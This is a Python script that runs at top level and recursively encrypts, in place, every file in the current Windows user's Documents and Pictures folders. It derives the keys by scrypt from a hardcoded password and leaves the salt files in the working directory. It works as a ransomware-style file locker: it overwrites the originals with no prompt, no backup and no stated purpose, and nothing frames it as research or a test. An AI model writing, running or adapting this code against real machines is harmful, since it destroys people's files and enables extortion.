import pathlib
import secrets
import os
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt


def encrypt(filename, key):
    """Given a filename (str) and key (bytes), it encrypts the file and write it"""
    f = Fernet(key)
    with open(filename, "rb") as file:
        # read all file data
        file_data = file.read()
    # encrypt data
    encrypted_data = f.encrypt(file_data)
    # write the encrypted file
    with open(filename, "wb") as file:
        file.write(encrypted_data)


def encrypt_folder(foldername, key):
    # If it's a folder, encrypt all the files in it
    for child in pathlib.Path(foldername).glob("*"):
        if child.is_file():
            # Skip system files like 'desktop.ini'
            if os.path.basename(child) == 'desktop.ini':
                print(f"Skipping system file: {child}")
                continue

            print(f"[*] Encrypting {child}")
            try:
                # Encrypt the file
                encrypt(child, key)
            except PermissionError:
                print(f"Permission denied for file: {child}")
            except Exception as e:
                print(f"An error occurred while encrypting {child}: {e}")
                
        elif child.is_dir():
            print(f"[*] Entering directory {child}")
            # Recursively encrypt files in subfolders
            encrypt_folder(child, key)

def generate_salt(size=16):
    return secrets.token_bytes(size)


def derive_key(salt, password):
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())



def generate_keyForDocuments(password, salt_size=16):
    salt = generate_salt(salt_size)
    with open("Documents.salt", "wb") as salt_file:
        salt_file.write(salt)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)


def generate_keyForPictures(password, salt_size=16):
    salt = generate_salt(salt_size)
    with open("Pictures.salt", "wb") as salt_file:
        salt_file.write(salt)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)


password = "fuckcancer"
keyForDocuments = generate_keyForDocuments(password, salt_size=2000)
Documents = os.path.join(os.environ['USERPROFILE'], 'Documents')
if os.path.isfile(Documents):
    encrypt(Documents, keyForDocuments)
elif os.path.isdir(Documents):
    encrypt_folder(Documents, keyForDocuments)

keyForPictures = generate_keyForPictures(password, salt_size=2000)
Pictures = os.path.join(os.environ['USERPROFILE'], 'Pictures')
if os.path.isfile(Pictures):
    encrypt(Pictures, keyForPictures)
elif os.path.isdir(Pictures):
    encrypt_folder(Pictures, keyForPictures)